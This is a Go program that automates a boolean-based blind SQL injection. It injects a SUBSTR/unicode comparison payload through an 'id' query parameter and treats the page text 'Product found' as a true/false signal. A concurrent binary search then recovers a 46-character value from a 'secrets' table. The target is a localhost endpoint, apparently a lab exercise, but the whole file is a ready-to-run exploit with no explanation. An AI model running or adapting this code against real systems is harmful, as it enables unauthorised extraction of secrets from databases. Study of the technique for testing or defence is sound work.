package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Observation struct {
	Status     string
	StatusCode int
	Body       string
	BodyLength int
}

type HTTPClient struct {
	BaseURL string
	Client  *http.Client
	Timeout time.Duration
}

func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
	baseURL = strings.TrimSpace(baseURL)
	baseURL = strings.TrimRight(baseURL, "/")

	client := http.Client{
		Timeout: timeOut,
	}

	return HTTPClient{
		BaseURL: baseURL,
		Client:  &client,
		Timeout: timeOut,
	}, nil
}

func buildPayload(position int, code int) string {
	return fmt.Sprintf(
		"1' AND unicode(SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1))>%d-- -",
		position,
		code,
	)
}

func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
	q := url.Values{}
	q.Set("id", payload)
	targetURL := c.BaseURL + "?" + q.Encode()

	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
	if err != nil {
		return Observation{}, fmt.Errorf("create new request %w", err)
	}

	res, err := c.Client.Do(req)
	if err != nil {
		return Observation{}, fmt.Errorf("client do request %w", err)
	}
	defer res.Body.Close()

	limitedReader := io.LimitReader(res.Body, 1024*1024)
	body, err := io.ReadAll(limitedReader)
	if err != nil {
		return Observation{}, fmt.Errorf("cannot read body %w", err)
	}

	bodyText := string(body)

	return Observation{
		Status:     res.Status,
		StatusCode: res.StatusCode,
		Body:       bodyText,
		BodyLength: len(body),
	}, nil
}

func bodyContainsOracle(obs Observation, marker string) bool {
	return strings.Contains(obs.Body, marker)
}

type IndexedRune struct {
	Index int
	Char  rune
}

func (c *HTTPClient) ExtractSecret(maxLen int, minCode int, maxCode int) string {
	resultCh := make(chan IndexedRune, maxLen)

	var wg sync.WaitGroup

	for position := 1; position <= maxLen; position++ {
		wg.Add(1)

		go func(position int) {
			defer wg.Done()

			low := minCode
			high := maxCode

			for low < high {
				mid := (low + high) / 2

				payload := buildPayload(position, mid)

				obs, err := c.SendPayload(payload)
				if err != nil {
					fmt.Fprintln(os.Stderr, "request error:", err)
					os.Exit(1)
				}

				ok := bodyContainsOracle(obs, "Product found")
				if ok {
					low = mid + 1
				} else {
					high = mid
				}
			}

			resultCh <- IndexedRune{
				Index: position - 1,
				Char:  rune(low),
			}
		}(position)
	}

	wg.Wait()
	close(resultCh)

	output := make([]rune, maxLen)

	for found := range resultCh {
		output[found.Index] = found.Char
	}

	return string(output)
}

func main() {
	client, err := NewHTTPClient("http://127.0.0.1:5006/boolean", 5*time.Second)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println(client.ExtractSecret(46, 32, 126))
}
